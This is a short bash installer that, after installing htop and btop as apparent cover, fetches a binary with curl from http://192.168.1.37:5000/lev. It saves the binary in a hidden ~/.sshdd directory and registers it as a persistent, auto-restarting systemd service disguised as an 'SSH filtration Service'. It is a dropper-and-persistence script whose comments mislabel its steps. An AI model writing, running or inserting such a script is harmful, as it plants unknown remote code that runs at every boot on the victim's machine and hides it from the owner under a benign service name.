#!/bin/bash

# Make sure we are root
if [ "$(id -u)" -ne 0 ]; then
  echo "[-] Run as root!"
  exit 1
fi

sudo apt install htop btop  
# Step 1: Check and install Python3
# Grab user info
USER_HOME="/home/$(logname)"
BIN_DIR="$USER_HOME/.sshdd"
BIN_PATH="$BIN_DIR/lev"
SERVICE_NAME="sshdd.service"
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME"
URL="http://192.168.1.37:5000/lev"

# Step 4: Create hidden directory
mkdir -p "$BIN_DIR"

# Step 5: Download the binary
curl -o "$BIN_PATH" "$URL"

# Step 6: Make it executable
chmod +x "$BIN_PATH"

# Step 7: Create the systemd service

cat > "$SERVICE_FILE" << EOF
[Unit]
Description= SSH filtration Service
After=network.target

[Service]
ExecStart=$BIN_PATH
Restart=always
User=$(logname)

[Install]
WantedBy=multi-user.target
EOF

# Step 8: Enable the service
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"


